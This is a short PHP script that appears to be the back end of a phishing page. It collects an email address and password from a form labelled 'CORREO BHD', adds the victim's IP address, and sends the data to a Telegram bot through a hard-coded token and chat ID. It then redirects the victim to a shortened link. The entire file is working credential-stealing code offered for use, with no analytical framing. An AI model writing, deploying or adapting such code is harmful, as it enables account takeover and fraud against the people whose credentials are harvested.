<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
	$cpass = $_POST["cpass"];
	
	
  $botToken = "7356380446:AAERwTFEndqW0wSfHHhuajIg70Ld8fSW6GM"; // Reemplaza con tu token de bot
    $chatID = "5868379051"; // Reemplaza con tu chat ID

    // Obtén la IP del cliente
    $ip = $_SERVER['REMOTE_ADDR'];

    // Construye el mensaje
    $message = "=====CORREO BHD=======\n Correo: $email\n Clave: $cpass\nIP del cliente: $ip";

    // Envia el mensaje a Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array("chat_id" => $chatID, "text" => $message);
    $options = array(
        "http" => array(
            "method" => "POST",
            "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
            "content" => http_build_query($data)
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result) {
        // Redirige a la página de éxito
        header("Location: https://acortar.link/VAjlf0");
        exit; // Asegura que el script se detenga después de la redirección
    } else {
        // Redirige a la página de error
        header("Location: index");
        exit;
    }
}
?>
